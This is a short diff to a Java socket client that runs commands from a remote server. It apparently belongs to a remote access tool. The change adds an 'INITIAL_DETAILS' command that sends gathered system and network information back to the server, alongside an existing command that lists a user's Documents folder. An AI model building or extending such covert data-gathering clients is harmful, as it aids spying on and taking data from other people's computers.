@@ -1,5 +1,7 @@
 package Client;
 
+import InformationGathering.SystemNetworkInformation;
+
 import java.io.*;
 import java.net.*;
 
@@ -20,6 +22,7 @@ public class Client {
             System.out.println("Conectado");
 
             PrintWriter writer = new PrintWriter(s.getOutputStream());
+            ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());
             BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));
 
             while (true) {
@@ -43,6 +46,9 @@ public class Client {
                         writer.flush();
                     }
                     case "TREE" -> new Thread(new Tree(new File("C:\\Users\\JAVIER\\Documents"), s)).start();
+                    case "INITIAL_DETAILS"-> {
+                        output.writeObject(new SystemNetworkInformation());
+                    }
                     default -> {
                     }
                 }
